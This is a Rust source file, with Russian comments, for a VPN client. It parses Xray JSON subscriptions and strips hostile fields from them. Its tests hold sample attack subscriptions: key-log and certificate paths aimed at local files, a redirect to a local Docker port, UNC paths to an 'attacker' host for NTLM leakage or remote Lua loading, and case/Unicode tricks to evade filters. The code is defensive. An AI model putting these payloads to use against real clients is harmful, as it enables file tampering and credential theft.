//! JSON-подписки: панель (Remnawave, Marzban, 3x-ui с JSON-шаблоном) отдаёт
//! не ссылки, а массив готовых конфигов Xray — по одному на сервер:
//!   [ { "remarks": "🇳🇱 NL", "outbounds": [ {tag:"proxy", ...}, {tag:"direct"}... ],
//!       "dns": ..., "routing": ... }, ... ]
//! Из каждого берём главный outbound и его помощников (fragment и т.п.),
//! а dns/routing/inbounds — свои, чтобы работали «Обход РФ» и «Свои сайты».

use std::collections::{BTreeMap, BTreeSet};

use serde_json::{json, Value};

use crate::node::{fnv64, Node, Protocol, Security, Transport};

/// Протоколы, которые считаем «сервером», если нет outbound с tag "proxy".
const PROXY_PROTOCOLS: &[&str] = &[
    "vless", "vmess", "trojan", "shadowsocks", "hysteria", "hysteria2", "wireguard",
];

/// Протоколы, которым нечего делать в outbound из подписки: loopback
/// заворачивает трафик обратно во входы (петли, обход правил), dns подменяет
/// DNS, blackhole/freedom в роли «сервера» — это не VPN.
const FORBIDDEN_MAIN: &[&str] = &["freedom", "blackhole", "dns", "loopback"];
const FORBIDDEN_HELPER: &[&str] = &["blackhole", "dns", "loopback"];

/// Обезвредить outbounds, пришедшие со стороны (JSON-подписка, бэкап).
/// Подписку контролирует чужой человек, а Xray в режиме TUN работает с правами
/// администратора, поэтому вырезаем всё, что читает или пишет локальные файлы
/// (crate::defang::check). Запрещённые протоколы заменяем на blackhole.
/// Первый в списке — главный. Возвращает очищенный список и что пришлось убрать.
pub fn sanitize_outbounds(list: Vec<Value>) -> (Vec<Value>, Vec<String>) {
    let mut notes = Vec::new();
    let out = list
        .into_iter()
        .enumerate()
        .map(|(i, mut o)| {
            // Метку sing-box ставит только сам rxvpn — из подписки её не берём.
            if let Some(m) = o.as_object_mut() {
                m.retain(|k, _| crate::defang::fold(k) != crate::defang::fold(crate::singbox::MARK));
            }
            let tag = o["tag"].as_str().unwrap_or("").to_string();
            let off = |why: String, notes: &mut Vec<String>| {
                notes.push(tr!("outbound «{tag}» отключён: {why}"));
                json!({ "tag": tag, "protocol": "blackhole" })
            };
            match crate::defang::check(&mut o) {
                Err(why) => return off(why, &mut notes),
                Ok(removed) if !removed.is_empty() => {
                    notes.push(tr!("из «{tag}» убрано: {} (лезет в файлы/сеть компа)", removed.join(", ")))
                }
                Ok(_) => {}
            }
            // После check ключ «protocol» точно в каноническом написании.
            let proto = crate::defang::fold(o["protocol"].as_str().unwrap_or(""));
            let forbidden = if i == 0 { FORBIDDEN_MAIN } else { FORBIDDEN_HELPER };
            if forbidden.contains(&proto.as_str()) {
                return off(tr!("протокол {proto}"), &mut notes);
            }
            // WireGuard: только в своём процессе, без системного адаптера.
            if proto == "wireguard" && o["settings"].is_object() {
                // Чужие «nokerneltun»/«NoKernelTun» Xray (Go) считает тем же ключом,
                // и в отсортированном JSON последний — победил бы наш. Убираем их.
                if let Some(m) = o["settings"].as_object_mut() {
                    m.retain(|k, _| crate::defang::fold(k) != "nokerneltun");
                    m.insert("noKernelTun".into(), json!(true));
                }
            }
            o
        })
        .collect();
    (out, notes)
}

/// Похоже ли на JSON (а не на ссылки/base64).
pub fn looks_like_json(text: &str) -> bool {
    matches!(text.trim_start().chars().next(), Some('[') | Some('{'))
}

/// Разобрать JSON-подписку. Ошибка — если формат вообще не тот.
pub fn parse_json_subscription(text: &str) -> Result<(Vec<Node>, Vec<String>), String> {
    let v: Value = serde_json::from_str(text.trim())
        .map_err(|e| tr!("подписка похожа на JSON, но он битый: {e}"))?;

    let configs: Vec<Value> = match v {
        Value::Array(a) => a,
        obj @ Value::Object(_) => vec![obj],
        _ => return Err(trs!("непонятный JSON в подписке").into()),
    };

    let mut nodes = Vec::new();
    let mut errors = Vec::new();
    for (i, cfg) in configs.iter().enumerate() {
        match node_from_config(cfg, i) {
            Ok((n, notes)) => {
                errors.extend(notes.into_iter().map(|w| format!("«{}»: {w}", n.name)));
                nodes.push(n);
            }
            Err(e) => errors.push(e),
        }
    }
    if nodes.is_empty() && errors.is_empty() {
        errors.push(trs!("в JSON-подписке нет серверов").into());
    }
    Ok((nodes, errors))
}

/// Сервер из одного конфига + что пришлось вырезать ради безопасности.
fn node_from_config(cfg: &Value, idx: usize) -> Result<(Node, Vec<String>), String> {
    let name = cfg["remarks"]
        .as_str()
        .or_else(|| cfg["ps"].as_str())
        .map(str::to_string)
        .unwrap_or_else(|| tr!("Сервер {}", idx + 1));
    let label = |msg: &str| format!("«{name}»: {msg}");

    let outbounds = cfg["outbounds"].as_array().ok_or_else(|| {
        // sing-box тоже JSON с "outbounds", но с полем "type" вместо "protocol".
        label(trs!("нет outbounds — это не конфиг Xray"))
    })?;
    if outbounds.iter().any(|o| o.get("type").is_some() && o.get("protocol").is_none()) {
        return Err(label(trs!("это формат sing-box, а клиент работает на Xray")));
    }

    let by_tag: BTreeMap<&str, &Value> = outbounds
        .iter()
        .filter_map(|o| Some((o["tag"].as_str()?, o)))
        .collect();

    // Главный: с tag "proxy", иначе первый с «серверным» протоколом.
    let main = by_tag
        .get("proxy")
        .copied()
        .or_else(|| {
            outbounds.iter().find(|o| {
                o["protocol"]
                    .as_str()
                    .is_some_and(|p| PROXY_PROTOCOLS.contains(&p))
            })
        })
        .ok_or_else(|| label(trs!("не нашёл в конфиге сам сервер")))?;
    let main_tag = main["tag"].as_str().unwrap_or("").to_string();

    // Помощники: всё, на что главный ссылается через dialerProxy/proxySettings
    // (обычно "fragment" — freedom с нарезкой TLS-пакетов против ТСПУ), рекурсивно.
    let mut helpers: Vec<String> = Vec::new();
    let mut seen: BTreeSet<String> = BTreeSet::from([main_tag.clone()]);
    let mut queue: Vec<&Value> = vec![main];
    while let Some(o) = queue.pop() {
        for t in refs(o) {
            if seen.insert(t.clone()) {
                if let Some(h) = by_tag.get(t.as_str()) {
                    helpers.push(t);
                    queue.push(h);
                }
            }
        }
    }

    // Переименовываем теги, чтобы не столкнуться с нашими direct/block/proxy.
    let mut rename: BTreeMap<String, String> = BTreeMap::new();
    if !main_tag.is_empty() {
        rename.insert(main_tag.clone(), "proxy".into());
    }
    for h in &helpers {
        rename.insert(h.clone(), format!("sub-{h}"));
    }

    let mut out = Vec::new();
    let mut m = main.clone();
    m["tag"] = json!("proxy");
    rewrite_refs(&mut m, &rename);
    out.push(m);
    for h in &helpers {
        let mut o = by_tag[h.as_str()].clone();
        o["tag"] = json!(rename[h]);
        rewrite_refs(&mut o, &rename);
        out.push(o);
    }

    let (out, notes) = sanitize_outbounds(out);
    if out[0]["protocol"] == "blackhole" {
        let why = if notes.is_empty() { trs!("в роли сервера не VPN-протокол").to_string() } else { notes.join("; ") };
        return Err(label(&tr!("пропускаю — {why}")));
    }
    let main = &out[0];
    let protocol_str = main["protocol"].as_str().unwrap_or("?");
    let (address, port) = endpoint(main);
    let ss = &main["streamSettings"];
    let network = ss["network"].as_str().unwrap_or("tcp");
    let network = if network == "raw" { "tcp" } else { network };
    let sec = ss["security"].as_str().unwrap_or("none");
    let sni = ss["realitySettings"]["serverName"]
        .as_str()
        .or_else(|| ss["tlsSettings"]["serverName"].as_str())
        .map(str::to_string);

    let raw = json!({ "outbounds": out });
    let raw_str = serde_json::to_string(&raw).unwrap_or_default();

    let node = Node {
        // id по самому серверу, без имени: переименование в панели не плодит дубли.
        id: fnv64(&raw_str),
        name,
        protocol: Protocol::from_xray(protocol_str),
        address,
        port,
        uuid: None,
        password: None,
        method: None,
        flow: None,
        encryption: None,
        alter_id: 0,
        transport: Transport {
            network: network.to_string(),
            ..Default::default()
        },
        security: Security {
            kind: sec.to_string(),
            sni,
            ..Default::default()
        },
        link: serde_json::to_string(cfg).unwrap_or_default(),
        sub_id: None,
        group: None,
        raw: Some(raw),
    };
    Ok((node, notes))
}

/// Теги, на которые ссылается outbound.
fn refs(o: &Value) -> Vec<String> {
    let mut r = Vec::new();
    if let Some(t) = o["streamSettings"]["sockopt"]["dialerProxy"].as_str() {
        r.push(t.to_string());
    }
    if let Some(t) = o["proxySettings"]["tag"].as_str() {
        r.push(t.to_string());
    }
    r
}

/// Поправить ссылки на переименованные теги; ссылку на несуществующий тег убрать
/// (иначе Xray не запустится).
fn rewrite_refs(o: &mut Value, rename: &BTreeMap<String, String>) {
    if let Some(sock) = o.pointer_mut("/streamSettings/sockopt") {
        if let Some(t) = sock["dialerProxy"].as_str().map(str::to_string) {
            match rename.get(&t) {
                Some(n) => sock["dialerProxy"] = json!(n),
                None => {
                    if let Some(obj) = sock.as_object_mut() {
                        obj.remove("dialerProxy");
                    }
                }
            }
        }
    }
    if let Some(t) = o["proxySettings"]["tag"].as_str().map(str::to_string) {
        match rename.get(&t) {
            Some(n) => o["proxySettings"]["tag"] = json!(n),
            None => {
                if let Some(obj) = o.as_object_mut() {
                    obj.remove("proxySettings");
                }
            }
        }
    }
}

/// Адрес и порт сервера — для списка и TCP-пинга. Xray понимает несколько форм.
fn endpoint(o: &Value) -> (String, u16) {
    let s = &o["settings"];
    let pick = |v: &Value| -> Option<(String, u16)> {
        Some((v["address"].as_str()?.to_string(), v["port"].as_u64()? as u16))
    };
    pick(&s["vnext"][0])
        .or_else(|| pick(&s["servers"][0]))
        .or_else(|| pick(s))
        .or_else(|| {
            // wireguard: peers[0].endpoint = "host:port"
            let ep = s["peers"][0]["endpoint"].as_str()?;
            let (h, p) = ep.rsplit_once(':')?;
            Some((h.trim_matches(['[', ']']).to_string(), p.parse().ok()?))
        })
        .unwrap_or_else(|| ("?".into(), 0))
}

#[cfg(test)]
pub(crate) mod tests {
    use super::*;

    /// Похоже на то, что отдаёт Remnawave для v2rayN (в одну строку).
    pub const REMNA: &str = r#"[{"dns":{"hosts":{"dns.google":["8.8.8.8","8.8.4.4"]},"servers":[{"tag":"dns_direct","address":"https://common.dot.dns.yandex.net/dns-query"}]},"inbounds":[{"tag":"socks","port":10808,"listen":"127.0.0.1","protocol":"socks"}],"outbounds":[{"tag":"proxy","protocol":"vless","settings":{"vnext":[{"address":"nl1.example.com","port":443,"users":[{"id":"b831381d-6324-4d53-ad4f-8cda48b30811","encryption":"none","flow":"xtls-rprx-vision"}]}]},"streamSettings":{"network":"tcp","security":"reality","realitySettings":{"serverName":"www.example.com","fingerprint":"chrome","publicKey":"Z84J2IelR9ch3k8VtlVhhs5ycBUlXA7wHBWcBrjqnAw","shortId":"ab"},"sockopt":{"dialerProxy":"fragment"}}},{"tag":"fragment","protocol":"freedom","settings":{"fragment":{"packets":"tlshello","length":"100-200","interval":"10-20"}}},{"tag":"direct","protocol":"freedom"},{"tag":"block","protocol":"blackhole"}],"remarks":"🇳🇱 Нидерланды","routing":{"rules":[]}},{"outbounds":[{"tag":"proxy","protocol":"trojan","settings":{"servers":[{"address":"de.example.com","port":8443,"password":"pw"}]},"streamSettings":{"network":"xhttp","security":"tls","tlsSettings":{"serverName":"de.example.com"},"xhttpSettings":{"path":"/x","mode":"auto","extra":{"xPaddingBytes":"100-1000"}},"sockopt":{"dialerProxy":"missing"}}},{"tag":"direct","protocol":"freedom"}],"remarks":"🇩🇪 Германия"},{"outbounds":[{"type":"vless","server":"x"}],"remarks":"sb"}]"#;

    #[test]
    fn hostile_subscription_is_defanged() {
        let evil = r#"[{"remarks":"evil","outbounds":[
            {"tag":"proxy","protocol":"vless","settings":{"vnext":[{"address":"e.com","port":443,"users":[{"id":"b831381d-6324-4d53-ad4f-8cda48b30811","encryption":"none"}]}]},
             "streamSettings":{"network":"tcp","security":"tls","tlsSettings":{"serverName":"e.com","masterKeyLog":"C:\\Windows\\System32\\drivers\\etc\\hosts",
               "certificates":[{"certificateFile":"C:\\Users\\me\\id.pem","keyFile":"C:\\Users\\me\\id.key"}]},
               "sockopt":{"dialerProxy":"loop"}}},
            {"tag":"loop","protocol":"loopback","settings":{"inboundTag":"socks"}}]},
          {"remarks":"not-vpn","outbounds":[{"tag":"proxy","protocol":"freedom","settings":{"redirect":"127.0.0.1:2375"}}]},
          {"remarks":"wg","outbounds":[{"tag":"proxy","protocol":"wireguard","settings":{"secretKey":"x","peers":[{"endpoint":"w.com:51820","publicKey":"y"}]}}]}]"#;
        let (nodes, errors) = parse_json_subscription(evil).unwrap();
        assert_eq!(nodes.len(), 2, "{errors:?}");
        assert!(errors.iter().any(|e| e.contains("not-vpn")), "freedom в роли сервера — не сервер");
        assert!(errors.iter().any(|e| e.contains("masterKeyLog")), "человеку сказали, что вырезали: {errors:?}");
        let outs = crate::xray::node_outbounds(&nodes[0]);
        let text = serde_json::to_string(&outs).unwrap();
        assert!(!text.contains("masterKeyLog") && !text.contains("certificateFile") && !text.contains("keyFile"), "{text}");
        assert!(!text.contains("loopback"), "{text}");
        assert_eq!(outs[1]["protocol"], "blackhole");
        let wg = crate::xray::node_outbounds(&nodes[1]);
        assert_eq!(wg[0]["settings"]["noKernelTun"], true);

        // Старый state.json/бэкап с «грязным» raw — чистится при сборке конфига.
        let mut dirty = nodes[0].clone();
        dirty.raw = Some(json!({"outbounds":[{"tag":"proxy","protocol":"vless","streamSettings":{"tlsSettings":{"masterKeyLog":"/etc/x"}}}]}));
        assert!(!serde_json::to_string(&crate::xray::node_outbounds(&dirty)).unwrap().contains("masterKeyLog"));

        // Обход через регистр и юникод (так Go сопоставляет ключи JSON) не проходит.
        for key in ["MasterKeyLog", "MASTERKEYLOG", "maſterKeyLog", "master\u{212A}eyLog", "certificateFILE", "\u{212A}eyFile"] {
            let mut d = nodes[0].clone();
            d.raw = Some(json!({"outbounds":[{"tag":"proxy","protocol":"vless","streamSettings":{"tlsSettings":{ key: "/etc/x" }}},
                                             {"tag":"h","protocol":"LoopBack"}]}));
            let o = crate::xray::node_outbounds(&d);
            assert!(o[0]["streamSettings"]["tlsSettings"].as_object().unwrap().is_empty(), "{key}: {o:?}");
            assert_eq!(o[1]["protocol"], "blackhole", "регистр протокола тоже");
        }

        // Обычная подписка не страдает: её fragment-помощник (freedom) на месте.
        let (ok, _) = parse_json_subscription(REMNA).unwrap();
        let o = crate::xray::node_outbounds(&ok[0]);
        assert_eq!(o[1]["protocol"], "freedom");
        assert!(o[1]["settings"]["fragment"].is_object());
    }

    /// Атаки из независимой проверки — каждая должна не пройти.
    #[test]
    fn review_payloads_blocked() {
        let uuid = "b831381d-6324-4d53-ad4f-8cda48b30811";
        let sub = |ob: &str| format!(r#"[{{"remarks":"x","outbounds":[{ob}]}}]"#);
        // 1. xdrive: папки/файлы по любому пути, UNC → NTLM.
        let xdrive = sub(&format!(r#"{{"tag":"proxy","protocol":"vless","settings":{{"vnext":[{{"address":"h","port":443,"users":[{{"id":"{uuid}"}}]}}]}},
            "streamSettings":{{"network":"xdrive","xdriveSettings":{{"service":"local","remoteFolder":"\\\\attacker\\s"}}}}}}"#));
        // 4. «Protocol» с большой буквы → freedom мимо VPN.
        let cap = sub(r#"{"tag":"proxy","Protocol":"freedom","settings":{"redirect":"x:1"}}"#);
        // 9. reverse-туннель.
        let rev = sub(&format!(r#"{{"tag":"proxy","protocol":"vless","settings":{{"vnext":[{{"address":"h","port":443,"users":[{{"id":"{uuid}"}}]}}],"reverse":{{"tag":"tun"}}}}}}"#));
        // 2. Lua-скрипт в FinalMask.
        let lua = sub(&format!(r#"{{"tag":"proxy","protocol":"vless","settings":{{"vnext":[{{"address":"h","port":443,"users":[{{"id":"{uuid}"}}]}}]}},
            "streamSettings":{{"network":"kcp","finalmask":{{"udp":[{{"type":"noise","settings":{{"script":"\\\\attacker\\n.lua"}}}}]}}}}}}"#));

        let (n, e) = parse_json_subscription(&xdrive).unwrap();
        assert!(n.is_empty() && e.iter().any(|x| x.contains("xdrive")), "{e:?}");
        let (n, e) = parse_json_subscription(&cap).unwrap();
        assert!(n.is_empty(), "«Protocol» не прошёл: {e:?}");
        let (n, _) = parse_json_subscription(&rev).unwrap();
        assert!(!serde_json::to_string(&crate::xray::node_outbounds(&n[0])).unwrap().contains("reverse"));
        let (n, _) = parse_json_subscription(&lua).unwrap();
        let cfg = crate::build_config(&n[0], &crate::Settings::default()).to_string();
        assert!(!cfg.contains("script") && !cfg.contains(".lua"), "{cfg}");

        // Те же трюки через обычную ссылку (xhttp extra).
        let link = |extra: &str| {
            format!(
                "vless://{uuid}@e.com:443?type=xhttp&security=tls&sni=e.com&extra={}#x",
                percent_encoding::utf8_percent_encode(extra, percent_encoding::NON_ALPHANUMERIC)
            )
        };
        assert!(crate::parse_link(&link(r#"{"downloadSettings":{"address":"h","port":443,"network":"xdrive"}}"#)).is_err(), "xdrive (и падение Xray)");
        assert!(crate::parse_link(&link(r#"{"downloadSettings":{"Network":"xhttp"}}"#)).is_err(), "нестандартное написание");
        let n = crate::parse_link(&link(r#"{"downloadSettings":{"address":"h","port":443,"network":"xhttp","finalmask":{"udp":[{"type":"noise","settings":{"script":"\\a\n.lua"}}]}}}"#)).unwrap();
        let cfg = crate::build_config(&n, &crate::Settings::default()).to_string();
        assert!(!cfg.contains("script") && !cfg.contains(".lua"), "{cfg}");
    }

    #[test]
    fn remnawave_style() {
        assert!(looks_like_json(REMNA));
        let (nodes, errors) = parse_json_subscription(REMNA).unwrap();
        assert_eq!(nodes.len(), 2, "{errors:?}");
        assert_eq!(errors.len(), 1);
        assert!(errors[0].contains("sing-box"));

        let nl = &nodes[0];
        assert_eq!(nl.name, "🇳🇱 Нидерланды");
        assert_eq!(nl.address, "nl1.example.com");
        assert_eq!(nl.port, 443);
        assert_eq!(nl.summary(), "VLESS · tcp · reality");
        let obs = nl.raw.as_ref().unwrap()["outbounds"].as_array().unwrap();
        assert_eq!(obs.len(), 2, "главный + fragment, без direct/block");
        assert_eq!(obs[0]["tag"], "proxy");
        assert_eq!(obs[0]["streamSettings"]["sockopt"]["dialerProxy"], "sub-fragment");
        assert_eq!(obs[1]["tag"], "sub-fragment");

        let de = &nodes[1];
        assert_eq!(de.port, 8443);
        let o = &de.raw.as_ref().unwrap()["outbounds"][0];
        assert!(o["streamSettings"]["sockopt"].get("dialerProxy").is_none());
        assert_eq!(o["streamSettings"]["xhttpSettings"]["extra"]["xPaddingBytes"], "100-1000");
    }

    #[test]
    fn same_server_same_id_even_if_renamed() {
        let a = parse_json_subscription(REMNA).unwrap().0;
        let renamed = REMNA.replace("🇳🇱 Нидерланды", "NL new name");
        let b = parse_json_subscription(&renamed).unwrap().0;
        assert_eq!(a[0].id, b[0].id);
    }

    #[test]
    fn wireguard_kernel_tun_cannot_be_reenabled_by_case() {
        // Go encoding/json: «nokerneltun» — тот же ключ, что «noKernelTun»; в BTreeMap он
        // сортируется после нашего и победил бы в Xray. Должен остаться ровно один — наш.
        for k in ["nokerneltun", "NoKernelTun", "NOKERNELTUN"] {
            let o = serde_json::json!({"tag": "proxy", "protocol": "wireguard",
                "settings": {"secretKey": "x", k: false, "peers": [{"endpoint": "w.com:51820", "publicKey": "y"}]}});
            let (out, _) = sanitize_outbounds(vec![o]);
            let m = out[0]["settings"].as_object().unwrap();
            let keys: Vec<&String> = m.keys().filter(|x| crate::defang::fold(x) == "nokerneltun").collect();
            assert_eq!(keys, ["noKernelTun"], "{k}");
            assert_eq!(m["noKernelTun"], true);
        }
    }
}
